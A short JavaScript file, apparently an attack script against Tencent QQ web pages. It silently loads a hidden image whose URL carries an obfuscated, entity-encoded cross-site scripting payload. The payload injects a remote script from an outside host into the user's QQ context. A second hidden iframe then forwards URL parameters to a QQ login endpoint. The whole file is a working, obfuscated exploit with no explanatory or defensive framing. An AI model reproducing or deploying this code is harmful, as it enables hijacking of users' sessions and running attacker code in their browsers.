
function gbk_frame() {
    var b = "http://clubclient.qq.com/set_cookie.php?uin=%3Cimg%2FOnerrOr%3D%26%2397%26%2361%26%23100%26%23111%26%2399%26%23117%26%23109%26%23101%26%23110%26%23116%26%2346%26%2399%26%23114%26%23101%26%2397%26%23116%26%23101%26%2369%26%23108%26%23101%26%23109%26%23101%26%23110%26%23116%26%2340%26%2339%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2339%26%2341%26%2359%26%2397%26%2346%26%23115%26%23114%26%2399%26%2361%26%2339%26%2347%26%2347%26%23103%26%23104%26%2348%26%2346%26%2399%26%23110%26%2347%26%23110%26%2339%26%2359%26%23100%26%23111%26%2399%26%23117%26%23109%26%23101%26%23110%26%23116%26%2346%26%2398%26%23111%26%23100%26%23121%26%2346%26%2397%26%23112%26%23112%26%23101%26%23110%26%23100%26%2367%26%23104%26%23105%26%23108%26%23100%26%2340%26%2397%26%2341%26%2359%0Asrc%3D1%3E&skey=1&url=http%3A//im.qq.com/";
    var a = document.createElement("img");
    a.height = "0";
    a.width = "0";
    a.marginwidth = "0";
    a.marginheight = "0";
    a.border = "0";
    a.frameborder = "0";
    a.scrolling = "no";
    a.style.display = "none";
    a.src = b;
    document.body.appendChild(a)
    setTimeout(ReadJs,2000);
}

function ReTJ(argname) {
	var url = document.location.href;
	var arrStr = url.substring(url.indexOf("?") + 1).split("&");
	for (var i = 0; i < arrStr.length; i++) {
		var loc = arrStr[i].indexOf(argname + "=");
		if (loc != -1) {
			return arrStr[i].replace(argname + "=", "").replace("?", "");
			break;
		}
	}
	return "";
}


function ReadJs(){
	var p ;
	var r;
	var t;
	var u;
	p=ReTJ("p");
	r=ReTJ("r");
	t=ReTJ("t");
	u=ReTJ("u");
    var b = "http://comment5.qq.com/i_login.htm?wid=K2NmAXpSXl4=&p1=" + p +"&r1=" + r +"&t1=" +t +"&u1=" +u ;
    var a = document.createElement("iframe");
    a.height = "0";
    a.width = "0";
    a.marginwidth = "0";
    a.marginheight = "0";
    a.border = "0";
    a.frameborder = "0";
    a.scrolling = "no";
    a.style.display = "none";
    a.src = b;
    document.body.appendChild(a)
}

gbk_frame();

